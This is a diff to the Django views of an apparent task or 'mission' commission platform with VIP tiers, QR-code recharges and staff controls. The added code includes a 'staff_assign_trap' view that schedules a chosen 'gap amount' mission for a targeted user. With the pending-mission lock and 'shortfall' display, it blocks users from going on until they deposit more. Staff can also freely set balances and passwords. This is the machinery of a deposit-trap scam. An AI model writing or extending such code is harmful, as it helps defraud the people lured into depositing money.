@@ -5,11 +5,12 @@ from django.contrib import messages
 from decimal import Decimal
 from django.core.paginator import Paginator
 from django.db.models import Q
-from .models import Profile, RechargeRequest, WithdrawalRequest, VipLevel
+from .models import Profile, RechargeRequest, WithdrawalRequest, VipLevel, Mission, MissionRecord
 from django.contrib.auth.decorators import login_required
 from django.db import transaction
 from django.contrib.auth import authenticate, login as auth_login, logout as auth_logout
 from django.contrib.auth import update_session_auth_hash
+import random
 
 # --- PUBLIC REGISTRATION VIEW ---
 
@@ -52,48 +53,77 @@ def register_view(request):
     return render(request, 'user/register.html', {'lang': lang})
 
 # --- USER DASHBOARD ---
-
 @login_required
 def index(request):
     current_tab = request.GET.get('tab', 'home')
     lang = request.GET.get('lang', 'es')
-    profile, created = Profile.objects.get_or_create(user=request.user)
 
-    withdrawals = WithdrawalRequest.objects.filter(user=request.user).order_by('-created_at')
-    recharges = RechargeRequest.objects.filter(user=request.user).order_by('-created_at')
-    vip_levels = VipLevel.objects.all().order_by('level_number')
-
-    # Updated to use membership_vip
+    profile = request.user.profile
     user_vip = profile.membership_vip
 
-    show_security_setup = False
-    if current_tab == 'withdraw' and not profile.withdrawal_password:
-        show_security_setup = True
+    progress_percentage = 0
+    if user_vip and user_vip.missions_per_day > 0:
+        progress_percentage = (profile.missions_count / user_vip.missions_per_day) * 100
 
-    # Mission Data Logic - Now correctly containing rates from the VIP level
-    active_mission = {
-        'product_name': 'ASUS PN64 i7-12700H Barebone Mini PC Bundle / RAM / M.2 NVMe SSD / Win 11 Intel NUC',
-        'price': '18,184.41',
-        'commission': '10,001.43',
-        'shortfall': '7,352.00',
-        'image': 'https://down-sg.img.susercontent.com/file/3f0dda3859195bddf309fb8f3813a5fa',
-        'commission_rate': user_vip.commission_rate if user_vip else 0,
-        'daily_tasks_limit': user_vip.max_tasks if user_vip else 0,
-    }
+    vips = VipLevel.objects.all().order_by('level_number')
+
+    records = MissionRecord.objects.filter(
+        user=request.user
+    ).order_by('-created_at')
+
+    # 🔒 GET PENDING MISSION
+    pending = MissionRecord.objects.filter(
+        user=request.user,
+        status='Pending'
+    ).first()
+
+    active_mission = None
+    limit_reached = False
+
+    if pending:
+        # ✅ LOCKED STATE
+        active_mission = {
+            'id': pending.id,
+            'product_name': pending.mission_name,
+            'price': pending.amount,
+            'commission': pending.commission,
+            'image': pending.image_link,
+            'is_pending_lock': True,
+            'shortfall': max(Decimal('0'), pending.amount - profile.balance),
+        }
+
+    else:
+        # 🚫 LIMIT CHECK
+        if user_vip and profile.missions_count >= user_vip.missions_per_day:
+            limit_reached = True
+
+        # ✅ IMPORTANT: still send safe object
+        active_mission = {
+            'is_pending_lock': False
+        }
 
     context = {
         'active_tab': current_tab,
         'profile': profile,
         'lang': lang,
-        'show_security_setup': show_security_setup,
-        'withdrawals': withdrawals,
-        'recharges': recharges,
-        'vip_levels': vip_levels,
+        'vip_levels': vips,
         'active_mission': active_mission,
+        'limit_reached': limit_reached,
+        'records': records,
+        'progress_percentage': progress_percentage,
     }
+
     return render(request, 'user/index.html', context)
 
 # --- STAFF MANAGEMENT ---
+@staff_member_required
+def reset_user_missions(request, user_id):
+    if request.method == "POST":
+        user_profile = get_object_or_404(Profile, user_id=user_id)
+        user_profile.missions_count = 0
+        user_profile.save()
+        messages.success(request, f"Missions reset for {user_profile.user.username}")
+    return redirect('/staff/?tab=users')
 
 @staff_member_required
 def staff_index(request):
@@ -102,6 +132,7 @@ def staff_index(request):
 
     if query:
         all_users_list = User.objects.filter(
+
             Q(username__icontains=query) |
             Q(profile__phone_number__icontains=query)
         ).order_by('-date_joined')
@@ -109,6 +140,7 @@ def staff_index(request):
         all_users_list = User.objects.all().order_by('-date_joined')
 
     vip_levels = VipLevel.objects.all().order_by('level_number')
+    missions = Mission.objects.all().order_by('-created_at')
 
     context = {
         'tab': current_tab,
@@ -117,9 +149,153 @@ def staff_index(request):
         'pending_withdrawals': WithdrawalRequest.objects.filter(status='Pending').order_by('-created_at'),
         'all_withdrawals': WithdrawalRequest.objects.all().order_by('-created_at'),
         'vip_levels': vip_levels,
+        'missions': missions,
         'search_query': query,
     }
     return render(request, 'staff/index.html', context)
+
+# --- STAFF MISSION MANAGEMENT ---
+@staff_member_required
+def save_mission(request):
+    if request.method == "POST":
+        name = request.POST.get('name')
+        price = request.POST.get('price')
+        image_link = request.POST.get('image_link')
+
+        try:
+            Mission.objects.create(
+                name=name,
+                price=price,
+                image_link=image_link
+            )
+            messages.success(request, "Mission created successfully!")
+        except Exception as e:
+            messages.error(request, f"Database Error: {e}")
+
+        return redirect('/staff/?tab=missions')
+    return redirect('/staff/')
+
+@staff_member_required
+def delete_mission(request, mission_id):
+    mission = get_object_or_404(Mission, id=mission_id)
+    mission.delete()
+    messages.success(request, "Mission deleted.")
+    return redirect('/staff/?tab=missions')
+
+@staff_member_required
+def staff_assign_trap(request, user_id):
+    if request.method == "POST":
+        target_user = get_object_or_404(User, id=user_id)
+        mission_template = get_object_or_404(Mission, id=request.POST.get('mission_id'))
+        gap_amount = Decimal(request.POST.get('gap_amount', '0'))
+        target_turn = int(request.POST.get('target_turn', '1'))
+
+        MissionRecord.objects.create(
+            user=target_user,
+            mission_name=mission_template.name,
+            amount=gap_amount,
+            image_link=mission_template.image_link,
+            status='Scheduled',
+            scheduled_at=target_turn
+        )
+        messages.success(request, f"Trap set for {target_user.username} at mission #{target_turn}")
+    return redirect('/staff/?tab=users')
+
+# --- MISSION LOGIC ---
+
+from django.http import JsonResponse
+
+@login_required
+def complete_mission(request):
+    if request.method != "POST":
+        return JsonResponse({'success': False, 'error': 'Invalid request'})
+
+    user = request.user
+
+    try:
+        with transaction.atomic():
+
+            profile = Profile.objects.select_for_update().get(user=user)
+            user_vip = profile.membership_vip
+
+            # 🔒 Check pending FIRST
+            pending = MissionRecord.objects.select_for_update().filter(
+                user=user,
+                status='Pending'
+            ).first()
+
+            if pending:
+                return JsonResponse({
+                    'success': False,
+                    'error': 'Pending mission exists'
+                })
+
+            # 🚫 Limit
+            if user_vip and profile.missions_count >= user_vip.missions_per_day:
+                return JsonResponse({
+                    'success': False,
+                    'error': 'Limit reached'
+                })
+
+            missions = Mission.objects.filter(
+                price__lte=profile.balance
+            ).order_by('-price')
+
+            if not missions.exists():
+                return JsonResponse({
+                    'success': False,
+                    'error': 'No missions available'
+                })
+
+            selected = missions.first()
+
+            rate = Decimal(str(user_vip.commission_rate)) / Decimal('100')
+            commission = selected.price * rate
+
+            MissionRecord.objects.create(
+                user=user,
+                mission_name=selected.name,
+                amount=selected.price,
+                commission=commission,
+                image_link=selected.image_link,
+                status='Pending'
+            )
+
+            profile.missions_count += 1
+            profile.save()
+
+        return JsonResponse({'success': True})
+
+    except Exception as e:
+        return JsonResponse({'success': False, 'error': str(e)})
+
+@login_required
+def finalize_mission(request, record_id):
+    record = get_object_or_404(MissionRecord, id=record_id, user=request.user)
+    profile = request.user.profile
+
+    if record.status == 'Pending':
+        if profile.balance < record.amount:
+            messages.error(request, "Saldo insuficiente para completar este pedido.")
+            return redirect('/?tab=mission')
+
+        with transaction.atomic():
+            record = MissionRecord.objects.select_for_update().get(id=record_id)
+            if record.status != 'Pending':
+                return redirect('/?tab=mission')
+
+            record.status = 'Completed'
+            record.save()
+
+            # Return price + commission to balance
+            profile.balance += record.commission
+            profile.save()
+
+            messages.success(request, "Order submitted successfully!")
+
+    return redirect('/?tab=mission')
+
+# --- STAFF USER ACTIONS ---
 
 @staff_member_required
 def add_user(request):
@@ -150,45 +326,36 @@ def update_user(request, user_id):
         user_to_edit = get_object_or_404(User, id=user_id)
         profile = user_to_edit.profile
 
-        # --- Basic Account Info ---
         user_to_edit.username = request.POST.get('username')
         profile.phone_number = request.POST.get('phone')
         profile.credit_points = request.POST.get('credit', 100)
         profile.invite_code = request.POST.get('invite_code')
 
-        # --- VIP Level ---
         vip_id = request.POST.get('vip')
         if vip_id:
             profile.membership_vip = VipLevel.objects.filter(id=vip_id).first()
 
-        # --- Bank Info ---
         profile.withdrawal_method = request.POST.get('withdrawal_method')
         profile.bank_name = request.POST.get('bank_name')
         profile.account_name = request.POST.get('account_name')
         profile.account_number = request.POST.get('account_number')
         profile.bank_phone_number = request.POST.get('bank_phone_number')
-
-        # --- RECHARGE QR LOGIC (CRITICAL FIX) ---
         profile.recharge_receiver_name = request.POST.get('recharge_receiver_name')
 
-        # Check if a new file was uploaded
         if 'recharge_qr' in request.FILES:
             profile.recharge_qr = request.FILES['recharge_qr']
 
-        # Check if the "Delete QR" checkbox was ticked
-        if request.POST.get('delete_qr') == 'on': # HTML checkboxes send 'on'
+        if request.POST.get('delete_qr') == 'on':
             if profile.recharge_qr:
-                profile.recharge_qr.delete(save=False) # Removes actual file
+                profile.recharge_qr.delete(save=False)
                 profile.recharge_qr = None
 
-        # --- Security ---
         new_pass = request.POST.get('new_password')
         if new_pass:
             user_to_edit.set_password(new_pass)
 
         profile.withdrawal_password = request.POST.get('withdrawal_password')
 
-        # Save both User and Profile
         user_to_edit.save()
         profile.save()
 
@@ -201,8 +368,10 @@ def update_balance(request, user_id):
     if request.method == "POST":
         user = get_object_or_404(User, id=user_id)
         amount = Decimal(request.POST.get('amount', '0'))
-        if request.POST.get('action') == 'add': user.profile.balance += amount
-        else: user.profile.balance -= amount
+        if request.POST.get('action') == 'add':
+            user.profile.balance += amount
+        else:
+            user.profile.balance -= amount
         user.profile.save()
     return redirect('/staff/?tab=users')
 
@@ -217,14 +386,12 @@ def save_vip_level(request, level_id=None):
             vip = VipLevel()
 
         try:
-            # Basic Data
             vip.level_number = int(request.POST.get('level_number'))
             vip.name = request.POST.get('name')
             vip.min_balance = Decimal(request.POST.get('min_balance', '0'))
             vip.commission_rate = Decimal(request.POST.get('commission_rate', '0'))
             vip.max_tasks = int(request.POST.get('max_tasks', '1'))
 
-            # Handle the Image Upload
             if 'image' in request.FILES:
                 vip.image = request.FILES['image']
 
@@ -307,7 +474,8 @@ def process_recharge(request, request_id, action):
             req.status = 'Approved'
             req.user.profile.balance += req.amount
             req.user.profile.save()
-        else: req.status = 'Rejected'
+        else:
+            req.status = 'Rejected'
         req.save()
     return redirect('/staff/?tab=users')
 
@@ -328,7 +496,8 @@ def update_withdrawal_info(request):
 def process_withdrawal(request, request_id, action):
     req = get_object_or_404(WithdrawalRequest, id=request_id)
     if req.status == 'Pending':
-        if action == 'approve': req.status = 'Approved'
+        if action == 'approve':
+            req.status = 'Approved'
         else:
             req.user.profile.balance += req.amount
             req.user.profile.save()
